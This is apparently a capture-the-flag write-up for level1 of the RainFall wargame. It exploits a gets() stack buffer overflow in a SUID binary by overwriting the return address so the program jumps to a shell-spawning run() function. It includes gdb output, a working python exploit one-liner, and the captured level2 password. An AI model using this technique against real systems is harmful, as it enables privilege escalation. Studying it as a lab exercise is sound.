We get in the level1, then we list the files:
```
    level1@RainFall:~$ ls -la
    -rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
```
The binary is owned by level2 and has the SUID bit set, meaning if it executes any shell, it will run with level2's privileges.

We try to execute the binary file to get an idea of what it does exactly

```
    level1@RainFall:~$ ./level1 
    dsfdsdas
    level1@RainFall:~$ ./level1 
    sadasjhdhjasgdjhasvdhjasbvdjhasbvdvjhasbdjhasbdjhasbdjhbasjhdbasjhdbasjhdbashjbdjhasbdhasjbdsabhdbas
    Segmentation fault (core dumped)
```
The program segfaults so there is a big chance of a stack buffer overflow in there;

We decompile the binary file to get the source code

Like we guessed, the function gets(buf) does not check input size (stack buffer overflow).

There is a function named run() that spawns a shell

So the goal is to overwrite the return address to point to run() function.

```
    int run() 
    {
        printf("Good... Wait what?\n");
        return system("/bin/sh");
    }

    int main(int argc, char** argv, char** envp) 
    {
        char buf[64];
        gets(buf);
        return (0);
    }
```

We use a pattern to crash the program and find the exact offset to the return address.

```
    (gdb) run
    Starting program: /home/user/level1/level1 
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

    Program received signal SIGSEGV, Segmentation fault.
    0x63413563 in ?? ()
``` 

The offset to overwrite the return address is 76 bytes.

```
    (gdb) info functions
    All defined functions:

    Non-debugging symbols:
    0x080482f8  _init
    0x08048340  gets
    0x08048340  gets@plt
    0x08048350  fwrite
    0x08048350  fwrite@plt
    0x08048360  system
    0x08048360  system@plt
    0x08048370  __gmon_start__
    0x08048370  __gmon_start__@plt
    0x08048380  __libc_start_main
    0x08048380  __libc_start_main@plt
    0x08048390  _start
    0x080483c0  __do_global_dtors_aux
    0x08048420  frame_dummy
    0x08048444  run
```

The address of function run() is 0x08048444 in little-indian "\x44\x84\x04\x08"

```
    level1@RainFall:~$ (python -c 'print("A"*76 + "\x44\x84\x04\x08")'; cat) | ./level1
    Good... Wait what?
    cat /home/user/level2/.pass     
    53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

We jump to next level 

```
level1@RainFall:~$ su level2
Password:53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level2/level2
level2@RainFall:~$
```